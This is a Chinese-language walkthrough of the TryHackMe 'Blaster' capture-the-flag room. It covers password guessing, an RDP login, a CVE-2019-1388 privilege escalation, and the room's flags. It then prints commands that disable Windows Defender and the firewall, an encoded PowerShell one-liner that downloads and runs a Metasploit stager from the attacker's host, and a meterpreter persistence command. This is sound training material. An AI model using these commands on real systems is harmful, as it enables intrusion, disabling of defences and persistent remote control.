# Blaster Writeup
> URL : https://tryhackme.com/room/blaster

IP: 10.10.188.122

先寫在前面，這一題初學者不建議打，官方的影片跟 Writeup 都不完全適用，可能是作者重新 Deploy 過題目或是做過一些升級，所以整題難度高了非常多 QQ

## Recon
- 老梗 `nmap -A 10.10.188.122`
	- ![](https://i.imgur.com/RZvanHI.png)
	- 發現有開兩個 port
		- 80
		- 3389
- How many ports are open on our target system?
	- 2
- Looks like there's a web server running, what is the title of the page we discover when browsing to it?
	- nmap 就告訴我們ㄌ
	- `IIS Windows Server`
- Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?
	- 預設的 `dirsearch` 找不到東西
		- ![](https://i.imgur.com/STu7dF0.png)
	- 這邊我用了 `dirb` 的 `big` Wordlist
		- `python3 dirsearch.py -u http://10.10.188.122 -e all -w /usr/share/dirb/wordlists/big.txt`
		- ![](https://i.imgur.com/AMoCMh4.png)
		- 掃到ㄌ http://10.10.188.122/retro/
- 透過 Wappalyzer 可以觀察到 
	- ![](https://i.imgur.com/hCmTpBu.png)
	- ![](https://i.imgur.com/XX4DVBz.png)
	- 他是一個 Wordpress

- Navigate to our discovered hidden directory, what potential username do we discover?
	- Po 文者都是 `Wade`

- Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?
	- 發現一篇文章
		```
		Ready Player One
		 I can’t believe the movie based on my favorite book of all time is going to come out in a few days! Maybe it’s because my name is so similar to the main character, but I honestly feel a deep connection to the main character Wade. I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! 
		```
	- 他說他最喜歡的書是 `Ready Player One` (一級玩家)
	- 他的名字跟主角很像，主角是 `Wade Owen Watts`
	- 然後他說他常常在登入時打錯他的 avatar
		- 抱歉我英文不好，查了之後才知道`avatar : （網路遊戲或網路聊天室中的）虛擬化身`
		- 所以應該是電影裡面的角色名稱
	- 在這邊查詢 `https://hero.fandom.com/wiki/Parzival_(Ready_Player_One)`
		- 可以找到 `Wade Owen Watts, under the virtual name Parzival`
	- 所以他的密碼是 `parzival`
		- 大小寫都 try 了一次，發現是全小寫

## RDP
- 透過 RDP 登入遠端系統
	- `xfreerdp +drives /u:Wade /v:10.10.151.248:3389`
	- 使用密碼 `parzival`
	- 即可順利登入
		- ![](https://i.imgur.com/Jf6GS9P.png)
- 取得 user flag
	- `THM{HACK_PLAYER_ONE}`
	- ![](https://i.imgur.com/OctDXza.png)
- 開始工具列搜尋 `system infomation`
	- ![](https://i.imgur.com/DjCfuSY.png)
	- 可以看到作業系統的版本等資訊
- 嘗試使用 winPEAS 來搜可以提權的點
	- powershell `wget http://10.13.21.55:8000/winPEAS.bat -outfile winPEAS.bat`
	- ![](https://i.imgur.com/hQCZjBk.png)
		- 有 Defender 把我吃掉ㄌ QQQQ

- 這邊依照官方的Writeup 以及教學，理論上可以在 IE 的瀏覽紀錄上找到一些蛛絲馬跡
	- ![](https://i.imgur.com/SPVazkE.png)
	- 但我這邊看到基本上是空的QQQQ
	- 好吧，那就當作這題是困難版的，繼續嘗試
## 可疑的檔案
- 在桌面上找到 `hhupd.exe`
	- ![](https://i.imgur.com/51pZngN.png)
- 直接丟去 Google 就會看到
	- ![](https://i.imgur.com/44Ojajv.png)
		- CVE-2019-1388 提權
- When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?
	- 完成正規解可以在瀏覽器蛛絲馬跡上找到的答案QQ
	- `CVE-2019-1388`
- Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?
	- 桌面上的檔案 `hhupd`



- 透過觀察網路上的資源
	- https://github.com/jas502n/CVE-2019-1388
	- 可以發現 CVE-2019-1388 是一個很酷ㄉ洞，基本實作細節如下
	1. 對著 `hhupd` 點兩下![](https://i.imgur.com/XkwHyEL.png)
	2. 跳出 UAC 後，選 show more details
		- ![](https://i.imgur.com/dtuDTnO.png)
	3. 選擇 `Show infomation about the publisher's certificate`
		- ![](https://i.imgur.com/LJZMN3W.png)
	4. 點選 Issued by: 後面的超連結
		- ![](https://i.imgur.com/9VoaaDW.png)
	5. 這個時候畫面還是顯示憑證資訊，我們可以按 OK 先關掉
	6. 再按 No 關閉 UAC
	7. 這個時候出現的 IE，而這個IE就是以 system 權限跑起來的
		- ![](https://i.imgur.com/cXh7MGi.png)
	8. 我們可以按下 ctrl + s 把網頁存檔，目的主要是為了叫出存檔的框框
	9. 這個時候會跳出一個錯誤，不重要，直接按下 OK
		- ![](https://i.imgur.com/NBmKhd5.png)
	10. 在上方路徑處輸入 `cmd` 或 `C:\Windows\System32\cmd.exe` 並按下 Enter
		- ![](https://i.imgur.com/z4jjJct.png)

	11. 會跳出一個 cmd 框框，而且是用 system 權限執行起來的
		- ![](https://i.imgur.com/YEuzHEM.png)
		- 提權完成
- Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?
	- `nt authority\system`
- 接下來就可以到 admin 資料夾的桌面領 root flag ㄌ
	- ![](https://i.imgur.com/DyvTkgT.png)
- Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!
	- `THM{COIN_OPERATED_EXPLOITATION}`

---
- 以下接段踩了非常多雷 QQQ
	- 先回到 cmd，我們把所有 Windows 的防火牆、Defender 全部都殺掉
		- 輸入 `%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe`
			- 使用 powershell
		- 輸入 `Set-MpPreference -DisableRealtimeMonitoring $true`
			- 把 Realtime Monitoring 功能關閉
		- 輸入 `Uninstall-WindowsFeature -Name Windows-Defender –whatif`
			- 把 Windows Defender 移除
		- 輸入 `Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`
			- 把 Windows Defender 移除
		- 輸入 `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`
			- 把防火牆關閉
- Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.
	- `msfconsole`
	- `use exploit/multi/script/web_delivery`
	- `show options`
		- ![](https://i.imgur.com/dlNUpBK.png)
	- `show targets`
		- ![](https://i.imgur.com/YNOicFA.png)

- First, let's set the target to PSH (PowerShell). Which target number is PSH? 
	- 2
	- 但這邊我發現 2 有機率失敗，而 3 比較穩
	- 就多試幾次 QQ
- 然後在上方我們可以看到
	- payload options 有 reverse_tcp ， 我們要設定我們的 IP 來收 meterpreter 的 reverse shell
	- `set LHOST 10.13.21.55`
	- `set LPORT 4444`
	- `set payload windows/meterpreter/reverse_http`
	- ![](https://i.imgur.com/SAyXmWT.png)
	- 輸入 `exploit`
	- 就會噴出 powershell 的指令
	```
	powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABCAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAEIALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABCAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4AMgAxAC4ANQA1ADoAOAAwADgAMAAvAHYARgBuADgAZABQAEIAVABZAGwALwBUAHUAVgB2AE8AUwBLAHQANQAzAEEANAByAGQANQAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAzAC4AMgAxAC4ANQA1ADoAOAAwADgAMAAvAHYARgBuADgAZABQAEIAVABZAGwAJwApACkAOwA=
	```
	- 貼上 cmd 按 enter
- 順利的話，他就會噴出
	- ![](https://i.imgur.com/vNXIoqu.png)
	- 如果不順利的話會卡死在
		- ![](https://i.imgur.com/IYfM5IU.png)
		- 也可以試試看重新貼一次，或改用 target 3
- 輸入 `sessions`
	- 可以觀察到目前有一個 meterpreter 的 sessions
		- ![](https://i.imgur.com/OA6CQ4j.png)
- 輸入 `sessions 1`
	- 可以切換到 sessions 1 的 meterpreter shell
	- ![](https://i.imgur.com/78l9mV6.png)
- Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 
	- 先執行 `run persistence -h`
	- ![](https://i.imgur.com/TMfcC6x.png)
	- 可以看到 -X 是 `Automatically start the agent when the system boots`
	- 所以答案是 `run persistence -X` 
	- ![](https://i.imgur.com/mAczfIt.png)
